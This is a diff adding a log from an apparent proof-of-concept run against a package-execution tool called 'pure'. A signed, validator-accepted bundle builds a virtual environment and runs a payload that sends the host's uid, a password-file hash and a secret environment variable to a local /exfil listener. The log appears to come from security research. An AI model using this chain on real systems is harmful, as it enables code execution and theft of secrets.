@@ -1,0 +1,26 @@
+[2026-11-22T10:08:19Z] START baseline_original_prior_poc
+[*] target pure: poc.native_rce.v1
+[*] source imports: os, subprocess, urllib, hashlib, json
+[*] _text_hash(source) = pure:4cbf53639db5125a
+[*] validator accepted. deps=('packaging==24.2',) requiresPython=>=3.14
+[*] signed bundle: 21f1a12e8f39ae7ef779b58efc8500ca950540b73b39dccd189f3b232be9f4ae
+[*] signer pubkey: 2152f8d19b791d24453242e15f2eab6cb7cffa7b6a5ed30097960e069881db12
+[*] listener on http://127.0.0.1:8899/exfil
+[*] resolve_and_register: {"artifactComponents": "9a94512fb56762e3493672028bb33ca45853532c250e872ea2395bff66392d0f", "artifactHash": "sha256:9a94512fb56762e3493672028bb33ca45853532c250e872ea2395bff66392d0f", "bundleHash": "21f1a12e8f39ae7ef779b58efc8500ca950540b73b39dccd189f3b232be9f4ae", "flow": "193c61121b89f5e89d931e812cf70413b2a57631eeff6d3e65914d67c8cde9e0", "registered": {"poc.native_rce.v1": "pure:4cbf53639db5125a"}}
+[*] registered tier=native_venv deps=('packaging==24.2',) requiresPython=>=3.14
+[*] invoking pure (builds uv venv, installs packaging, execs payload)...
+[listener] POST /exfil 516 bytes
+[*] pure returned in 0.1s: {"exfiltrated": true, "proof": {"cwd": "/tmp/opencode/julep-hard", "hostname": "kali-original", "marker": "JULEP-NATIVE-VENV-RCE-PROOF-7f3c9a", "passwd_sha256": "3c61cd72f7a5e918a7590318567ade9962d4f8d3c0ec0ad65fdf1a4e375f39c0", "pid": 8319, "secret_env": "sk-live-poc-secret-9d1f4a", "uid": "uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),124(lpadmin),132(wireshark),134(kaboxer),135(vboxsf),982(ollama)"}}
+[+] EXFILTRATED PROOF:
+{
+  "cwd": "/tmp/opencode/julep-hard",
+  "hostname": "kali-original",
+  "marker": "JULEP-NATIVE-VENV-RCE-PROOF-7f3c9a",
+  "passwd_sha256": "3c61cd72f7a5e918a7590318567ade9962d4f8d3c0ec0ad65fdf1a4e375f39c0",
+  "pid": 8319,
+  "secret_env": "sk-live-poc-secret-9d1f4a",
+  "uid": "uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),124(lpadmin),132(wireshark),134(kaboxer),135(vboxsf),982(ollama)"
+}
+[+] proof sha256: aa711e8b5024db98fab9895356c48204e809b8c8226fdd9193524be733862553
+[+] checks: {"env_secret_matches": true, "marker_matches": true, "passwd_read": true, "uid_is_real": true}
+[2026-11-22T10:08:20Z] END baseline_original_prior_poc rc=0
